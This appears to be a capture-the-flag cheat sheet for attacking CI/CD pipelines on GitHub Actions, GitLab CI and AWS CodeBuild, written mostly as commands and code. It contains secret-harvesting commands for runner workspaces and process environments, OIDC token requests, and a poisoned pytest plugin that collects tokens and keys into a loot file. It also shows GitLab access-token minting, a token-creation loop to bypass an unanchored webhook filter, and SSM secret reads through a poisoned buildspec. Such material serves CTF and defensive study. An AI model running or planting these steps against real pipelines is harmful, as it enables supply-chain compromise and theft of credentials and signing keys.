# CI/CD

## Fingerprint

```text
.github/workflows/
.gitlab-ci.yml
buildspec.yml
Jenkinsfile
.circleci/
.drone.yml
GITHUB_ACTIONS / RUNNER_*
CI_JOB_TOKEN / GITLAB_CI
CODEBUILD_* / CODEBUILD_SRC_DIR
ACTIONS_ID_TOKEN_REQUEST_URL
```

`CI=true` alone is noise. Look for the platform-specific variables, runner files, and build logs.

## Enumerate

```bash
env | sort
cat /proc/1/environ | tr '\0' '\n'

find / -maxdepth 4 \
  \( -name '.github' -o -name '.gitlab-ci.yml' -o -name 'buildspec.yml' \
     -o -name 'Jenkinsfile' -o -name '.circleci' \) 2>/dev/null

git log -p --all -- .github .gitlab-ci.yml buildspec.yml Jenkinsfile
```

Read the pipeline as an attacker:

```text
which branches trigger it
which secrets are injected
who can change the script or a dependency
whether fork/MR code runs with secrets
whether the runner is hosted or self-hosted
```

## GitHub Actions

High-value triggers:

```text
pull_request_target
workflow_run
issue_comment
repository_dispatch
schedule
```

A fork PR that gets secrets, a checkout of untrusted code, or a writable self-hosted runner is usually enough.

Self-hosted runner loot:

```bash
ls -la /home/runner/actions-runner
cat /home/runner/actions-runner/.runner
cat /home/runner/actions-runner/_diag/*.log
find /home/runner/_work -maxdepth 4 -type f 2>/dev/null
```

Persistent runners keep workspaces, tool caches, and old job data:

```bash
find /home/runner/_work -name '*.env' -o -name '*.log' -o -name '*.json' 2>/dev/null
grep -RInE 'TOKEN|SECRET|PASSWORD|AWS_' /home/runner/_work 2>/dev/null
```

### Poisoned pytest plugin

A dependency can add an orphan module that pytest imports automatically. Look for recently modified packages or files outside the checked-out repository:

```bash
find / -path '*/site-packages/*' -name '*.py' -newermt '-2 hours' 2>/dev/null
find / -name 'conftest.py' -o -name 'pytest.ini' 2>/dev/null
grep -RIn 'pytest_sessionfinish\|os.environ\|requests.post' \
  /usr/lib/python*/site-packages /usr/local/lib/python*/site-packages 2>/dev/null
```

Minimal collection hook:

```python
# site-packages/_pytest/veryveryverymalicious.py
import json
import os


def pytest_sessionfinish(session, exitstatus):
    wanted = ("TOKEN", "KEY", "SECRET", "AWS", "GITHUB", "CI")
    loot = {k: v for k, v in os.environ.items() if any(w in k for w in wanted)}
    with open("/tmp/loot.json", "w") as f:
        json.dump(loot, f)
```

The same idea works with `sitecustomize.py`, a modified `conftest.py`, a build script, or a package `__init__.py`.

### Recover encrypted loot

Fernet is common because it is a single key and URL-safe token:

```python
from cryptography.fernet import Fernet

key = b"BASE64_URLSAFE_32_BYTE_KEY="
token = b"gAAAAAB..."
print(Fernet(key).decrypt(token).decode())
```

Single-byte XOR obfuscation:

```python
data = open("blob.bin", "rb").read()
print(bytes(b ^ 17 for b in data).decode(errors="replace"))
```

### GitHub OIDC

```bash
echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"

curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com"
```

The returned JWT can be exchanged with `sts:AssumeRoleWithWebIdentity` if the cloud trust policy accepts the repository and branch.

## GitLab CI

```bash
env | grep -E '^CI_|^GITLAB'
cat /etc/gitlab-runner/config.toml 2>/dev/null
cat ~/.gitlab-runner/config.toml 2>/dev/null

curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://GITLAB/api/v4/projects"
```

Useful variables:

```text
CI_JOB_TOKEN
CI_PROJECT_ID / CI_PROJECT_PATH
CI_MERGE_REQUEST_SOURCE_PROJECT_ID
CI_MERGE_REQUEST_PROJECT_URL
CI_PIPELINE_SOURCE
CI_SERVER_URL
```

Fork/MR pipelines can expose the target project's CI variables even when the source project is attacker-controlled. Check whether the pipeline runs `include`, `script`, or a test file from the merge request branch.

Project access tokens and bot users are useful when the token scope is too narrow:

```bash
curl -s --header "PRIVATE-TOKEN: $TOKEN" \
  "https://GITLAB/api/v4/projects/PROJECT_ID/access_tokens"

curl -s -X POST --header "PRIVATE-TOKEN: $TOKEN" \
  "https://GITLAB/api/v4/projects/PROJECT_ID/access_tokens" \
  -d 'name=ci&scopes[]=api&access_level=40'
```

## AWS CodeBuild

```bash
env | grep CODEBUILD
cat buildspec.yml

aws codebuild list-projects
aws codebuild batch-get-projects --names PROJECT
aws codebuild start-build --project-name PROJECT
aws codebuild batch-get-builds --ids BUILD_ID
```

Useful variables:

```text
CODEBUILD_SRC_DIR
CODEBUILD_BUILD_ID
CODEBUILD_WEBHOOK_ACTOR_ACCOUNT_ID
CODEBUILD_WEBHOOK_TRIGGER
CODEBUILD_WEBHOOK_EVENT
CODEBUILD_PROJECT_NAME
```

### Unanchored webhook filter

A webhook filter is often written without anchors:

```json
{"type": "ACTOR_ACCOUNT_ID", "pattern": "17531"}
```

That matches `17531`, but also `117531` and `175310`. If the filter is meant to allow one actor, the regex must be anchored:

```json
{"type": "ACTOR_ACCOUNT_ID", "pattern": "^17531$"}
```

When an attacker can create identities, generate identifiers until the substring matches:

```bash
# Example GitLab project access token loop; inspect the returned bot username/UID.
for i in $(seq 1 500); do
  curl -s -X POST --header "PRIVATE-TOKEN: $TOKEN" \
    "https://GITLAB/api/v4/projects/$PROJECT/access_tokens" \
    -d "name=probe-$i&scopes[]=api&access_level=30"
done
```

Then trigger the pipeline with a merge request or push and observe whether CodeBuild starts.

### Poisoned pipeline execution

Look for a buildspec that runs a repository-controlled script without pinning:

```yaml
phases:
  build:
    commands:
      - ./tests/run.sh
```

If `tests/run.sh` is changed by a merge request, the build runs attacker code with the CodeBuild service role. The role may read SSM, S3, or a signing key:

```bash
aws ssm get-parameter --name /path/to/key --with-decryption
aws s3 ls
aws sts get-caller-identity
```

A challenge-specific signing pattern was:

```python
import hashlib
import hmac

key = b"KEY_FROM_SSM"
email = "user@example.com"
print(hmac.new(key, f"12:{email}".encode(), hashlib.sha256).hexdigest()[:24])
```

## Secrets In CI

```text
env / printenv
/proc/1/environ
runner _work / _temp / _diag
build logs and artifacts
git history and deleted files
cache directories
cloud OIDC token
```

Do not forget the adjacent jobs on a shared runner. A different container may have the secret you need in its environment or workspace.

## CTF Chains

```text
Fork PR -> workflow with secrets -> checkout attacker code -> cloud token
Self-hosted runner -> poisoned pytest plugin -> env harvest -> Fernet -> public dead drop
GitLab MR -> unpinned test script -> CodeBuild role -> SSM signing key -> HMAC flag
Leaked CI token -> enumerate projects -> access token -> repository write -> pipeline
```

## References

* [GitHub Actions security hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
* [GitLab CI/CD security](https://docs.gitlab.com/ee/ci/security/)
* [AWS CodeBuild webhooks](https://docs.aws.amazon.com/codebuild/latest/userguide/webhooks.html)
* [OWASP CI/CD security](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
* [Supply chain attacks](https://slsa.dev/)
